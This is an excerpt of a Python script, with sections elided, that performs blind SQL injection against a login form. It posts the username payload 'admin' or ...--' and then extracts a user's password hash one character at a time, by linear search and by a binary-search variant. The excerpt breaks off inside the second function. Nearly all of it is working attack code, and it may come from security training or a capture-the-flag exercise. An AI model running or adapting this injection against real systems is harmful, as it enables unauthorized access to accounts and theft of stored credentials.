...
def injected_query(payload):
    ...
    r = requests.post(target, data={"username": "admin' or {}--".format(payload), "password":"password"}) # Blind SQL Injection
    total_queries += 1
...
def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(0, password_length):  # iterates over password length
...
def extract_hash_bst(charset, user_id, password_length):
    found = ""
    for index in range(0, password_length): # Iterate
        start = 0
        end = len(charset) - 1
        while start <= end:
            if end - start == 1:
